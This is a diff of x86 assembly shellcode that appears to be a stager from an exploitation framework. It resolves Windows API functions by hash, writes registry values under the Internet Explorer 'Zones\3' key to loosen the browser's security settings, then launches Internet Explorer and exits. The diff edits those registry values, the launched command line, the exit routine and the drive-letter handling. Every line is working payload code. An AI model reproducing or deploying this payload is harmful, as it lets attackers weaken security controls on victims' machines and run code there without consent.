@@ -5,11 +5,11 @@ _start:
 	cld
 	call  get_find_function
 strings:
-	db    "Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", 0
+	db    "Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", 0x0
 reg_values:
-	db    "1004120012011405"
+	db    "1004120012011001"
 url:
-	db    "hh AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0
+	db    "C:\progra~1\intern~1\iexplore -new", 0x0
 
 get_find_function:
 	call startup
@@ -30,7 +30,6 @@ find_function_loop:
 	compute_hash:
 	xor   eax, eax
 	cdq
-	cld
 compute_hash_again:
 	lodsb
 	test  al, al
@@ -67,15 +66,17 @@ find_kernel32_nt:
 	mov   esi, [eax + 0x1c]
 	lodsd
 	mov   eax, [eax + 0x8]
-	jmp   find_kernel32_finished
+	jmp   short find_kernel32_finished
 find_kernel32_9x:
 	mov   eax, [eax + 0x34]
-	add   eax, 0x7c
+	add   eax, byte 0x7c
 	mov   eax, [eax + 0x3c]
 find_kernel32_finished:
 
 	mov   ebp, esp
 find_kernel32_symbols:
+	push  0x73e2d87e ; ExitProcess
+	push  eax
 	push  0x16b3fe72 ; CreateProcessA
 	push  eax
 	push  0xec0e4e8e ; LoadLibraryA
@@ -84,6 +85,8 @@ find_kernel32_symbols:
 	xchg  eax, esi
 	call  edi
 	mov   [ebp], eax
+	call  edi
+	mov   [ebp + 0x4], eax
 
 load_advapi32:
 	push  edx
@@ -98,7 +101,7 @@ resolve_advapi32_symbols:
 	push  0x2d1c9add
 	push  eax
 	call  edi
-	mov   [ebp + 0x4], eax
+	mov   [ebp + 0x8], eax
 	call  edi
 	xchg  eax, edi
  
@@ -114,7 +117,7 @@ open_key:
 	push  eax
 	mov   edi, esp
 set_values:
-	cmp   byte [esi], 'h'
+	cmp   byte [esi], 'C'
 	jz    initialize_structs
 	push  eax
 	lodsd
@@ -126,11 +129,18 @@ set_values:
 	push  byte 0x0
 	push  eax
 	push  ebx
-	call  [ebp + 0x4]
+	call  [ebp + 0x8]
 	jmp   set_values
 
+; This is NT specific, but it lets us execute explorer regardless
+; of what drive it's installed on so long as it's on the same drive
+; as the WINDOWS directory, which it should always be.
+fixup_drive_letter:
+	mov   al, byte [0x7ffe0030]
+	mov   byte [esi], al
+
 initialize_structs:
-	push  0x54
+	push  byte 0x54
 	pop   ecx
 	sub   esp, ecx
 	mov   edi, esp
@@ -141,7 +151,8 @@ initialize_structs:
 	inc   byte [edi + 0x2c]
 	inc   byte [edi + 0x2d]
 execute_process:
-	push  edi
+	lea   ebx, [edi + 0x44]
+	push  ebx
 	push  edi
 	push  eax
 	push  eax
@@ -154,6 +165,4 @@ execute_process:
 	call  [ebp]
 
 exit_process:
-	int3
-	
-
+	call  [ebp + 0x4]	
